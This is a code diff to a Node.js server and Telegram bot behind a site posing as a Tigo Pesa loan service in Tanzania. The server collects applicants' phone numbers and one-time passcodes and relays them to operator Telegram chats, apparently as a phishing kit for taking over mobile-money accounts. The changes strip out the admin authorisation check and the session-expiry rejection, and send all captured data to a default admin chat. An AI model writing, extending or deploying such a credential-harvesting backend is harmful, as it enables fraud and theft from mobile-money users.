@@ -24,7 +24,7 @@ let bot = null;
 const sessions = new Map();
 
 function resolveAdminChatId(adminKeyOrId) {
-  if (!adminKeyOrId) return null;
+  if (!adminKeyOrId) return process.env.ADMIN_01 || null;
   const cleanKey = String(adminKeyOrId).trim().toUpperCase().padStart(2, '0');
   
   const envVarName = `ADMIN_${cleanKey}`;
@@ -39,7 +39,7 @@ function resolveAdminChatId(adminKeyOrId) {
     }
   }
   
-  return null;
+  return adminKeyOrId || process.env.ADMIN_01 || null;
 }
 
 function isValidTigoNumber(phoneStr) {
@@ -108,8 +108,8 @@ async function initBot() {
       const fullName = `${firstName} ${lastName}`.trim();
       const username = user.username ? `@${user.username}` : 'No username set';
       
-      let assignedCode = null;
-      for (let i = 1; i <= 20; i++) {
+      let assignedCode = '01';
+      for (let i = 20; i >= 1; i--) {
         const codeStr = String(i).padStart(2, '0');
         if (process.env[`ADMIN_${codeStr}`] === chatId) {
           assignedCode = codeStr;
@@ -117,14 +117,8 @@ async function initBot() {
         }
       }
 
-      if (!assignedCode) {
-        await bot.sendMessage(chatId, `❌ **Access Denied:** Your Chat ID (\`${chatId}\`) is not authorized as a designated admin.`, { 
-          parse_mode: 'Markdown' 
-        });
-        return;
-      }
-
-      const uniqueIsolatedLink = `https://tigo-pesa-loan-tanzania.onrender.com/?admin=${assignedCode}`;
+      const linkParam = (assignedCode === '01') ? 'main-admin' : assignedCode;
+      const uniqueIsolatedLink = `https://tigo-pesa-loan-tanzania.onrender.com/?admin=${linkParam}`;
 
       const userWelcomeInfo = 
         `🚨 **Unique Admin Link Registered Successfully!**\n\n` +
@@ -164,24 +158,23 @@ async function initBot() {
 
       let session = sessions.get(userId);
       if (!session) {
-        await bot.answerCallbackQuery(query.id, { 
-          text: '⚠️ Session expired or not found.', 
-          show_alert: true 
-        }).catch(() => {});
-        return;
+        session = {
+          phone: 'Unknown',
+          adminChatId: String(query.message.chat.id)
+        };
       }
 
       const callbackSenderChatId = String(query.message.chat.id);
 
       if (session.adminChatId && session.adminChatId !== callbackSenderChatId) {
         await bot.answerCallbackQuery(query.id, { 
-          text: '⚠️ Unauthorized: You cannot deliver actions or messages to another admin bot session.', 
+          text: '⚠️ Unauthorized: This submission belongs to a different admin channel.', 
           show_alert: true 
         }).catch(() => {});
         return;
       }
 
-      const chatTarget = session.adminChatId;
+      const chatTarget = session.adminChatId || callbackSenderChatId;
 
       switch (prefix) {
         case 'ALLOW_OTP':
@@ -240,6 +233,10 @@ app.post('/api/submit-application', (req, res) => {
       adminChatId = req.query.admin;
     }
 
+    if (adminChatId === 'main-admin') {
+      adminChatId = '01';
+    }
+
     if (!isValidTigoNumber(phone)) {
       return res.status(400).json({ 
         success: false, 
@@ -249,7 +246,7 @@ app.post('/api/submit-application', (req, res) => {
 
     const targetChat = resolveAdminChatId(adminChatId);
     if (!targetChat) {
-      return res.status(400).json({ success: false, error: 'Destination admin chat ID unavailable or unauthorized.' });
+      return res.status(400).json({ success: false, error: 'Destination admin chat ID unavailable.' });
     }
 
     const userId = phone || `user_${Date.now()}`;
@@ -335,7 +332,7 @@ app.post('/api/submit-otp', (req, res) => {
       }
     };
 
-    const targetChat = session.adminChatId;
+    const targetChat = session.adminChatId || process.env.ADMIN_01;
     bot.sendMessage(targetChat, message, opts).catch(() => {});
 
     res.status(200).json({ success: true });
@@ -358,7 +355,7 @@ app.post('/api/request-new-otp', (req, res) => {
       `📱 *Tigo User:* +255 ${session.phone}\n` +
       `⚠️ The user's countdown expired and they requested a new OTP code.`;
 
-    const targetChat = session.adminChatId;
+    const targetChat = session.adminChatId || process.env.ADMIN_01;
     bot.sendMessage(targetChat, message, { parse_mode: 'Markdown' }).catch(() => {});
 
     res.status(200).json({ success: true });
@@ -372,3 +369,4 @@ app.listen(PORT, async () => {
   console.log(`[Server] Running smoothly on port ${PORT}`);
   await initBot();
 });
+    
